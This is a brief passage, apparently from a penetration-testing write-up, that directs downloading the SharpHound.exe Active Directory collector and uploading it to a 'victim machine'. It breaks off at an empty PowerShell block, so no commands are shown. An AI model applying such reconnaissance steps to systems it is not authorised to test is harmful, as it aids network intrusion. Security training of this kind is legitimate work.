...
What we need to perform on the victim machine is to first download the [Sharphound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) utility and upload it to the machine: 
```powershell
